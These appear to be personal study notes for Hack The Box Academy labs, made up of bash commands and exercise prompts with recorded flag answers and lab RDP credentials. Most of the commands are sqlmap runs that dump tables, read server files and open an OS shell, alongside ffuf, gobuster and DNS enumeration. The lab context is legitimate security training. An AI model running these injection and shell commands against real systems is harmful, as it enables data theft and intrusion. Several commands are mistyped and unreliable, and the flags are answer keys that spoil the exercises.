
```bash
# What's the contents of table flag2? (Case #2)
sqlmap  --batch --dump -T flag2 --forms --crawl=2
# HTB{700_much_c0n6r475_0n_p057_r3qu357}

# What's the contents of table flag3 (Case#3)
sqlmap -u 94.237.49.212:33817/case2.php --cookie='id=1*' --dump --batch -T flag3 --level=5 --risk=3
# HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475}

# What's the contents of table flag4 (Case #4)
sqlmap -r req.txt-u 94.237.49.212:33817/case2.php/?id=1
# HTB{j450n_v00rh335_53nd5_6r475}
```

```bash
# What's the contents of table flag1 in testdb database (Case #1)
sqlmap -u 94.237.50.13:51001/case1.php/ -D testdb -T flag1 --batch --dump --crawl 2
```

```bash
# What's the name of the column containing "style" in it's name (Case #1)
# sqlmap -u "83.136.251.63:57001" --schema
sqlmap -u "83.136.251.63:57001" --search -C style --random-agent --tamper=space2comment

# What's the Kimberly user's password? (Case #1)
sqlmap -u 94.237.63.201:36417" --dump users --passwords crawl=2
```

```bash
# What's the contents of table flag8? (Case #8)
sqlmap -u 83.136.254.233:59619/case8.php -T flag8 --batch --dump --csrf-token="t0ken" --crawl=2 --forms --random-agent 
# HTB{y0u_h4v3_b33n_c5rf_70k3n1z3d}

# What's the contents of table flag9? (Case #9)
sqlmap -u " 83.136.254.233:59619/case9.php/id=1&uid=4118292662" -T flag9 --batch --dump --randomize=uid --crawl=2 --random-agent
# HTB{700_much_r4nd0mn355_f0r_my_74573}

# What's the contents of table flag10? (Case #10)
# 1
proxychains4 -q -f <(echo "strict_chain\nproxy_dns\nremote_dns_subnet 224\ntcp_read_time_out 15000\ntcp_connect_time_out 8000\n[ProxyList]\nhttp 192.168.1.1 8080")
# 2
proxychains4 -q -f <(echo "strict_chain\nremote_dns_-subnet 224\ntcp_read_time_out15000\ntcp_connect_time_out8000\n[ProxyList]\nhttp 192.168.1.1 8080") sqlmap -u "83.136.254.233:59619/case10.php/?id=1&uid=4118292662" -T flag10 --dump --randomize=uid --crawl=2 --random-agent --tamper=space2comment -v 1 --level=3 risk=2


# What's the contents of table flag11? (Case #11)

sqlmap -u "94.237.54.41:34291/case11.php/?id=1" -T flag11 --dump --crawl=2 --tamper=space2comment

```

```bash
# Try to use SQLMap to read the file "/var/www/html/flag.txt".
sqlmap -u "http://94.237.63.201:48886" --file-read "/var/www/html/flag.txt"
# HTB{5up3r_u53r5_4r3_p0w3rful!}

# Use SQLMap to get an interactive OS shell on the remote host # and try to find another flag within the host.
# The flag is in a very common directory!
sqlmap -u "http://94.237.63.201:48886" --os-shell --crawl=2 --technique=E
# HTB{n3v3r_run_db_45_db4}

```

```bash
# What's the contents of the table final_flag?

``` 



```bash
# values generation 1 to 1000
for i in $(seq 1 1000); do echo $i >> ids.txt; done
```


```bash
# id value fuzzing
ffuf -w ids.txt:FUZZ -u http:83.136.255.180:43420 -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
```

```bash
# parameter fuzzing
# 94.237.49.178:41421
ffuf -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u "http://admin.academy.htb:41421/admin/admin.php?FUZZ=key" -fs 798
```
## General

### Intro to Network Traffic Analysis
<!-- RDP w/ htb-student and HTB_@cademy_stdnt! -->

```bash
# Notes
# xfreerdp /v:10.129.43.4 /u:htb-student /p:HTB_@cademy_stdnt!

# What was the name of the new user created on mrb3n's host?

# How many total packets were there in the Guided-analysis PCAP?

# What was the suspicious port that was being used?
```

```bash
# What user account was used to initiate the RDP Connection?


```

### Intro to Assembly Language



### Documentation and Reporting
```bash
xfreerdp /v:10.129.166.23 /u:htb-student /p:HTB_@cademy_stdnt!

# Connect to the testing VM using Xfreerdp and practice testing, documentation, and reporting against the target lab. Once the target spawns, browse to the WriteHat instance on port 443 and authenticate with the provided admin credentials. Play around with the tool and practice adding findings to the database to get a feel for the reporting tools available to us. Remember that all data will be lost once the target resets, so save any practice findings locally! Next, complete the in-progress penetration test. Once you achieve Domain Admin level access, submit the contents of the flag.txt file on the Administrator Desktop on the DC01 host.

### Information Gathering Web Edition

### zonetransfer.me
```bash
## Identifying Nameservers
nslookup -type=NS zonetransfer.me

## Testing for ANY and AXFR Zone Transfer
nslookup -query=AXFR zonetransfer.me nsztmi1.digi.ninja

```bash
## target - 10.129.168.51
## What is the FQDN of the IP address 10.10.34.136?
nslookup 10.10.34.136 10.129.168.51
dig -x 10.10.34.136
nmap -sL 10.10.34.136

## What FQDN is assigned to the IP address 10.10.1.5? Submit the FQDN as the answer.

## Which IP address is assigned to the "us.inlanefreight.htb" subdomain. Submit the IP address as the answer.

# curl -s http://192.168.10.10 -H "Host: randomtarget.com"
# VHost Fuzzing
cat ./vhosts | while read vhost;do echo "\n********\nFUZZING: ${vhost}\n********";curl -s -I http://192.168.10.10 -H "HOST: ${vhost}.randomtarget.com" | grep "Content-Length: ";done
# Ffuf
ffuf -w ./vhosts -u http://192.168.10.10 -H "HOST: FUZZ.randomtarget.com" -fs 612

## target 10.129.134.122
##  vhost www.inlanefreight.htb

## Enumerate the target and find a vHost that contains the flag No 1. Submit the flag value as your answer (in the format HTB{DATA}).

gobuster vhost -u http://10.129.134.122 -w /opt/useful/SecLists/Discovery/DNS/namelist.txt -t 50
ffuf -u http://10.129.134.122 -H "Host: FUZZ.inlanefreight.htb" -w /opt/useful/SecLists/Discovery/DNS/namelist.txt -mc all -fs 612
gobuster vhost -u http://10.129.134.122 -w /opt/useful/SecLists/Discovery/DNS/namelist.txt -p {GOBUSTER}.inlanefreight.htb --exclude-length 301 -t 10


## Enumerate the target and find a vHost that contains flag No. 2. Submit the flag value as your answer (in the format HTB{DATA}).

## Enumerate the target and find a vHost that contains flag No. 3. Submit the flag value as your answer (in the format HTB{DATA}).

## Enumerate the target and find a vHost that contains flag No. 4. Submit the flag value as your answer (in the format HTB{DATA}). 

## Find the specific vHost that starts with the letter "d" and submit the flag value as your answer (in the format HTB{DATA}).
```

```bash
# SKILLS ASSESSMENT
## What is the registrar IANA ID number for the githubapp.com domain?
whois githubapp.com
# 292

## What is the last mailserver returned when querying the MX records for githubapp.com?
dig mx githubapp.com
# aspmx5.googlemail.com

## Perform active infrastructure identification against the host https://i.imgur.com. What server name is returned for the host?
curl -I 'https://i.imgur.com'
# catfactory 1.0

## Perform subdomain enumeration against the target githubapp.com. Which subdomain has the word 'triage' in the name?
# check https://crt.sh/?q=githubapp.com
```

### Using Web Proxies

```bash
# target - 83.136.254.15:31385
# Use Burp Intruder to fuzz for '.html' files under the /admin directory, to find a file containing the flag.
# You can add .html after the position pointer (i.e., §1§.html), or you can use a Payload Processing rule to append .html to each line of payload.

# The directory we found above sets the cookie to the md5 hash of the username, as we can see the md5 cookie in the request for the (guest) user. Visit '/skills/' to get a request with a cookie, then try to use ZAP Fuzzer to fuzz the cookie for different md5 hashed usernames to get the flag. Use the "top-usernames-shortlist.txt" wordlist from Seclists.
# Use the 'MD5 Hash' processor and look for the page with a different content-length.

# Run ZAP Scanner on the target above to identify directories and potential vulnerabilities. Once you find the high-level vulnerability, try to use it to read the flag at '/flag.txt'

# The /lucky.php page has a button that appears to be disabled. Try to enable the button, and then click it to get the flag.
# The button does not always give the flag from the first click, so try to make it easy to click it many times until you get the flag.

# The /admin.php page uses a cookie that has been encoded multiple times. Try to decode the cookie until you get a value with 31-characters. Submit the value as the answer.

# Once you decode the cookie, you will notice that it is only 31 characters long, which appears to be an md5 hash missing its last character. So, try to fuzz the last character of the decoded md5 cookie with all alpha-numeric characters, while encoding each request with the encoding methods you identified above. (You may use the "alphanum-case.txt" wordlist from Seclist for the payload)
# With payload processing in Burp Intruder, first add the decoded cookie as a prefix to the payload, then encode the entire payload with the same encoding methods you identified earlier (in reverse order). The final payload should be 88 characters long, similar to the one from the previous question.

# You are using the 'auxiliary/scanner/http/coldfusion_locale_traversal' tool within Metasploit, but it is not working properly for you. You decide to capture the request sent by Metasploit so you can manually verify it and repeat it. Once you capture the request, what is the 'XXXXX' directory being called in '/XXXXX/administrator/..'?
# You may set any website as your RHOST.









```

